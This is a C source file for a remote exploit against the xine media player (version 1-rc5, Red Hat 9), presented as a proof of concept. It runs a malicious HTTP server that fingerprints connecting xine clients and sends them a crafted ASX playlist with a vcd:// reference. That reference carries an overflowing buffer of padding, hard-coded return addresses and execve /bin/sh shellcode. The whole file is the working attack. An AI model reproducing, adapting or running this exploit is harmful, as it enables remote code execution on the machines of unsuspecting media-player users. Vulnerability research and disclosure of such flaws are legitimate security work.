#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#ifdef linux
 #include <getopt.h>
#endif


#define SUCCESS 0
#define FAILURE 1

#define BUFFER  1044
#define CDATA   150
#define JMP     200

#define THREAT  "xine/1-rc5"
#define XPLOIT_OS Redhat9


#define example(OhNoo)  fprintf(stderr, "Usage: ./xines_mine -a <align_val> -p <port>\n\n", OhNoo);


void die(char * errtrap);
void banner(void);
int prepsock(int align_stack, int port);
int pkg_send(int clisock_fd, int align_stack, char * pload, char * payload);
int main(int argc, char ** argv);


static char * http[] = {
        "HTTP/1.0 200 OK\r\n",
        "Date: Thu, 23 May 2004 12:52:15 GMT\r\n",
        "Server: Xines_Mine Server(Linux)\r\n",
        "MIME-version: 1.0\r\n",
        "Content-Type: audio/x-mpegurl\r\n",
        "Content-Length: 2000\r\n",
        "Connection: close\r\n",
        "\r\n"
};


static char * vcdmuxor[] = {
        "<ASX version = \"3.0\">\r\n",
        "<TITLE>Xines_Mine</TITLE>\r\n",
        "<AUTHOR> c0ntex[at]open-security.org www.open-security.org</AUTHOR>\r\n",
        "<ENTRY>\r\n",
        "<ref href=\"vcd://",
        "\"/>\r\n",
        "</ENTRY>\r\n",
        "</ASX>\r\n",
        "\r\n"
};


static char opcode[] =  "\x31\xc0\x31\xdb\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
                                 "\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd"
                                 "\x80\x31\xc0\x31\xdb\xfe\xc0\xcd\x80";


void
die(char * errtrap)
{
        perror(errtrap);
        _exit(FAILURE);
        //exit(1);
}


void
banner(void)
{
        fprintf(stderr, "\n   **  Xines_Mine - Remote proof of concept example  **\n\n");
        fprintf(stderr, "[-] Uses .asx header reference to make Xine think it has valid\n");
        fprintf(stderr, "[-] reference file, then a crafted package is sent to overflow\n");
        fprintf(stderr, "[-] the vulnerable client && prove remote exploit concept.\n");
        fprintf(stderr, "[-] c0ntex[at]open-security.org {} http://www.open-security.org  \n\n");
}


int
prepsock(int align_stack, int port)
{
      unsigned int cl_buf, recv_chk, reuse = 1;
      unsigned int clisock_fd;

      signed int sock_fd;

      static char chk_vuln[CDATA];
      static char payload[BUFFER];

      struct sockaddr_in victimised, xine;

      char *pload = (char *) &opcode;


      ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
      ? die("Could not create socket")
      : (setsockopt(sock_fd,SOL_SOCKET,SO_REUSEADDR, &reuse, sizeof(int)) == -1)
            ? die("Could not re-use socket")
                : memset(&xine, 0, sizeof(xine));

      xine.sin_family = AF_INET;
      xine.sin_port = htons(port);
      xine.sin_addr.s_addr = htonl(INADDR_ANY);

      if(bind(sock_fd, (struct sockaddr *)&xine, sizeof(struct sockaddr)) == -1) {
        close(sock_fd); die("Could not bind socket");
      }

      if(listen(sock_fd, 0) == -1) {
              close(sock_fd); die("Could not listen on socket");
      }


      printf(" -> Listening for a connection on port %d\n", port);


      cl_buf = sizeof(victimised);
      clisock_fd = accept(sock_fd, (struct sockaddr *)&victimised, &cl_buf);

      if(!clisock_fd) {
        die("Could not accept connection\n");
      }

      if(!close(sock_fd)) {
        fprintf(stderr, "Could not close socket\n");
      }


      fprintf(stderr, " -> Action: Attaching from host [%s]\n", inet_ntoa(victimised.sin_addr));
      fprintf(stderr, " -> Using align [%d] and port [%d]\n", align_stack, port);


      //memset(chk_vuln, 0, CDATA);
      memset(chk_vuln, 0, sizeof(chk_vuln));

      recv_chk = recv(clisock_fd, chk_vuln, sizeof(chk_vuln), 0);
      chk_vuln[recv_chk+1] = '\0';

      if((recv_chk == -1) || (recv_chk == 0)) {
              fprintf(stderr, "Could not receive data from client\n");
      }

      if(strstr(chk_vuln, THREAT)) {
              fprintf(stderr, " -> Detected vulnerable Xine version\n");
      }else{
              fprintf(stderr, " -> Detected a non-Xine connection, end.\n");
                  close(clisock_fd); die("Ending connection, not a Xine client\n");
      }

      if(pkg_send(clisock_fd, align_stack, pload, payload) == 1) {
              fprintf(stderr, "Could not send package\n");
              close(clisock_fd); die("Could not send package!\n");
      }

      if(close(clisock_fd) != 0) {
                fprintf(stderr, "Could not close socket\n");
        }

      return clisock_fd;
      //return SUCCESS;
}


int
pkg_send(int clisock_fd, int align_stack, char * pload, char * payload)
{
        unsigned int i = 0;

        memset(payload, 0, BUFFER);

        for(i = (BUFFER - JMP + align_stack); i < BUFFER; i += 4) {
               payload[i] = 0xbc;
               payload[i+1] = 0xe7;
               payload[i+2] = 0x7f;
               payload[i+3] = 0xbf;
        }

        for (i = 0; i < (BUFFER - 33 - 20); i += 2) {//7 ) {
                payload[i] = 0x4d;
                payload[i+1] = 0x45;
                //payload[i+1] = 0x63;
                //payload[i+1] = 0x30;
                //payload[i+1] = 0x6e;
                //payload[i+1] = 0x74;
                //payload[i+1] = 0x65;
                //payload[i+1] = 0x78;
                //payload[i+1] = 0x90;
        }

        memcpy(payload + i, pload, strlen(pload));

        payload[1045] = 0x00;


        fprintf(stderr, " -> Payload size to send is [%4d]\n", strlen(payload));
        fprintf(stderr, " -> Sending evil payload to our client\n");    fflush(stderr);


        for (i = 0; i < 8; i++)
                if(send(clisock_fd, http[i], strlen(http[i]), 0) == -1) {
                        close(clisock_fd); die("Could not send HTTP header");
                }fprintf(stderr, "\t- Sending valid HTTP header..\n"); sleep(1);

        for (i = 0; i < 5; i++)
                if(send(clisock_fd, vcdmuxor[i], strlen(vcdmuxor[i]), 0) == -1) {
                        close(clisock_fd); die("Could not send asx header");
                }fprintf(stderr, "\t- Sending starter asx header..\n"); sleep(1);

        if(send(clisock_fd, payload, strlen(payload), 0) == -1) {
                close(clisock_fd); die("Could not send payload");
        }fprintf(stderr, "\t- Sending payload package..\n"); sleep(1);

        for (i = 5; i < 9; i++)
                if(send(clisock_fd, vcdmuxor[i], strlen(vcdmuxor[i]), 0) == -1) {
                        close(clisock_fd); die("Could not send asx header");
                }fprintf(stderr, "\t- Sending cleanup asx header..\n");

        return EXIT_SUCCESS;
}


int
main(int argc, char ** argv)
{
        unsigned int align_stack = 0, port = 80;
        unsigned int opts;

        static char * exploit = NULL;

        if(argc < 2) {
                goto jumpout;
        }banner();


        while((opts = getopt(argc, argv, "a:p:")) != -1) {
                switch(opts)
                        {
                        case 'a':
                                align_stack = atoi(optarg);
                                if((align_stack < 0) || (align_stack > 3)) {
                                        goto jumpout;
                                }
                                break;
                        case 'p':
                                port = atoi(optarg);
                                if((port < 0) || (port > 65535)) {
                                        goto jumpout;
                                }
                                break;
                        default:
                                goto jumpout;
                                break;
                        }
        }

        if(prepsock(align_stack, port) == -1) {
                fprintf(stderr, "Error\n");
                _exit(FAILURE);
        } fprintf(stderr, " -> Test complete\n\n");

        return EXIT_SUCCESS;

        jumpout:
                banner();
                example(exploit);
                return EXIT_FAILURE;
}

